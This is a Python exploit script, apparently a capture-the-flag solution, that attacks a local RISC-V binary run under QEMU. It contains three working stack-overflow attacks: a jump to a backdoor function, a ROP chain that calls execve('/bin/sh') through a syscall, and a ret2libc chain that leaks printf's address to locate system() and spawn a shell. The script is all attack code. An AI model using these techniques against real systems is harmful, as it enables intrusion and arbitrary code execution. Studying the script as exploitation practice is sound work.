from pwncli import *  # type: ignore # Add other required names explicitly

context.binary = './hello'

import argparse

parser = argparse.ArgumentParser(description='Exploit static binary with QEMU')
parser.add_argument('--debug', action='store_true', help='Run in debug mode')
args = parser.parse_args()

debug_flag = False

if args.debug:
    context.log_level = 'debug'
    gift.io = process(['qemu-riscv64', '-g', '1234', '-L', './lib','./hello'])
    debug_flag = True
else:
    context.log_level = 'debug'
    gift.io = process(['qemu-riscv64', '-L', './lib','./hello'])

gift.elf = ELF('./hello')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = ELF('./lib/lib/libc.so.6')

def ret2text():
    back_door = 0x107E8
    payload = flat([cyclic(0x20), p64(back_door)])
    
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2syscall():
    bin_sh = 0x10A08
    ld_a0_a1_a2_ra_ret = 0x10814
    ld_a7_ra_ret = 0x10830
    ecall = 0x10840
    payload = flat([cyclic(0x20), 
                p64(ld_a0_a1_a2_ra_ret), 
                p64(bin_sh), p64(0), p64(0), 
                p64(ld_a7_ra_ret),
                p64(221), p64(ecall)])

    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()
    ru("\n")

def ret2libc():
    printf_plt = elf.plt['printf']
    printf_got = elf.got['printf']
    start_addr = elf.sym['_start']
    ld_a0_a1_a2_ra_ret = 0x10814
    ld_t0_ra_jr_t0 = 0x10844
    payload_1 = flat([
        cyclic(0x20),
        p64(ld_a0_a1_a2_ra_ret),
        p64(printf_got),
        p64(0),
        p64(0),
        p64(ld_t0_ra_jr_t0),
        p64(printf_plt),  # x3
        p64(start_addr)   # lr Return to _start
    ])
    if debug_flag: pause()
    sa("Enter a string: ", payload_1)
    ru("\n")
    printf_addr = u64(r(6).ljust(8, b'\x00'))
    libc.address = printf_addr - libc.sym['printf']
    log.success(f"printf address: {hex(printf_addr)}")
    log.success(f"libc base address: {hex(libc.address)}")
    log.success(f"system address: {hex(libc.sym['system'])}")
    log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
    if debug_flag: pause()
    payload_2 = flat([
        cyclic(0x20),
        p64(ld_a0_a1_a2_ra_ret),
        p64(next(libc.search(b'/bin/sh\x00'))),
        p64(0),
        p64(0),
        p64(libc.sym['system']),
    ])
    sa("Enter a string: ", payload_2)
    if debug_flag: pause()
    ru("\n")

if __name__ == "__main__":
    ret2libc()
    gift.io.interactive()